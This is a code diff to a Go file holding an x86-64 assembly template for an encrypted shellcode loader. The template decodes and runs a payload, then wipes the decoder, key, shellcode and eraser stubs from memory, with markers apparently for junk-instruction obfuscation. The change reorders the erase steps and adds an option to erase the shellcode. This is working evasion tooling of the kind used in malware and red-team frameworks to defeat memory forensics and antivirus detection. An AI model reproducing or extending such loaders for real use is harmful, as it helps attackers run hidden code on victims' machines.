@@ -205,7 +205,7 @@ entry:
   // calculate the entry address
   lea rbx, [rip + entry]
 
-  // save context for call shellcode
+  // save arguments for call shellcode
   push rcx
   push rdx
   push r8
@@ -217,32 +217,54 @@ entry:
   call erase_decoder_stub
   call erase_crypto_key_stub
 
-  // restore context for call shellcode
-  pop r9
-  pop r8
-  pop rdx
-  pop rcx
+  // erase useless functions and entry
+ flag_eraser:
+  lea rcx, [rbx + mini_xor]          {{igi}}
+  mov rdx, decoder_stub - mini_xor   {{igi}}
+  call eraser_stub                   {{igi}}
 
-  // erase entry
+  mov rcx, rbx                       {{igi}}
+  mov rdx, flag_eraser               {{igi}}
+  call eraser_stub                   {{igi}}
+
+  // restore arguments for call shellcode
+  pop r9                             {{igi}}
+  pop r8                             {{igi}}
+  pop rdx                            {{igi}}
+  pop rcx                            {{igi}}
 
   // execute the shellcode
-  sub rsp, 0x80                    {{igi}}     // reserve stack
-  call shellcode_stub              {{igi}}     // call the shellcode
-  add rsp, 0x80                    {{igi}}     // restore stack
- 
-  // erase the remaining instructions
-  push rax                         {{igi}}     // save the shellcode return value
-  call erase_shellcode_stub        {{igi}}
-  call erase_eraser_stub           {{igi}}
-  pop rax                          {{igi}}     // restore the shellcode return value
+  sub rsp, 0x80                      {{igi}}
+  call shellcode_stub                {{igi}}
+  add rsp, 0x80                      {{igi}}
 
-  fxrstor [rsp]                    {{igi}}     // restore FP registers
-  add rsp, 0x200                   {{igi}}     // reserve stack
-  mov rsp, rbp                     {{igi}}     // restore stack address
-  pop rbp                          {{igi}}     // restore rbp
-  pop rbx                          {{igi}}     // restore rbx
+  // save the shellcode return value
+  push rax                           {{igi}}
+
+  // erase the shellcode stub
+{{if .EraseShellcode}}
+  lea rcx, [rbx + shellcode_stub]    {{igi}}
+  mov rdx, {{hex .ShellcodeLen}}     {{igi}}
+  call eraser_stub                   {{igi}}
+{{end}}
+
+  // erase the eraser stub (27 byte)
+  lea rdi, [rbx + eraser_stub]       {{igi}}
+  lea rsi, [rbx + crypto_key_stub]   {{igi}}
+  mov rcx, {{hex .EraserLen}}        {{igi}}
+  cld                                {{igi}}
+  rep movsb                          {{igi}}
+
+  // restore the shellcode return value
+  pop rax                            {{igi}}
+
+  fxrstor [rsp]                      {{igi}}   // restore FP registers
+  add rsp, 0x200                     {{igi}}   // reserve stack
+  mov rsp, rbp                       {{igi}}   // restore stack address
+  pop rbp                            {{igi}}   // restore rbp
+  pop rbx                            {{igi}}   // restore rbx
   {{db .RestoreContext}}                       // restore GP registers
-  ret                              {{igi}}
+  ret                                {{igi}}   // return to the caller
 
 // rcx = data address, rdx = data length, r8 = key.
 // this function assumes that the data length is divisible by 8.
@@ -281,39 +303,26 @@ decode_shellcode:
   add rsp, 0x40
   ret
 
-// TODO merge the next func
 erase_decoder_stub:
-  lea rcx, [rbx + decoder_stub]              {{igi}}
-  mov rdx, eraser_stub - decoder_stub        {{igi}}
-  call eraser_stub                           {{igi}}
-  ret                                        {{igi}}
+  lea rcx, [rbx + decoder_stub]
+  mov rdx, eraser_stub - decoder_stub
+  call eraser_stub
+  ret
 
 erase_crypto_key_stub:
-  lea rcx, [rbx + crypto_key_stub]           {{igi}}
-  mov rdx, shellcode_stub - crypto_key_stub  {{igi}}
-  call eraser_stub                           {{igi}}
-  ret                                        {{igi}}
-
-erase_shellcode_stub:
-  // test rax, rax
-  // jmp skip_erase
-  lea rcx, [rbx + shellcode_stub]            {{igi}}
-  mov rdx, {{hex .ShellcodeLen}}             {{igi}}
-  call eraser_stub                           {{igi}}
-  skip_erase:
-  ret                                        {{igi}}
-
-erase_eraser_stub:
-  ret                                        {{igi}}
+  lea rcx, [rbx + crypto_key_stub]
+  mov rdx, shellcode_stub - crypto_key_stub
+  call eraser_stub
+  ret
 
 decoder_stub:
-  {{db .DecoderStub}}                        {{igi}}
+  {{db .DecoderStub}}                {{igi}}
 
 eraser_stub:
-  {{db .EraserStub}}                         {{igi}}
+  {{db .EraserStub}}                 {{igi}}
 
 crypto_key_stub:
-  {{db .CryptoKeyStub}}                      {{igi}}
+  {{db .CryptoKeyStub}}              {{igi}}
 
 shellcode_stub:
 `
@@ -331,6 +340,9 @@ type loaderCtx struct {
 
 	CryptoKeyLen int
 	ShellcodeLen int
+	EraserLen    int
+
+	EraseShellcode bool
 }
 
 func toDB(b []byte) string {
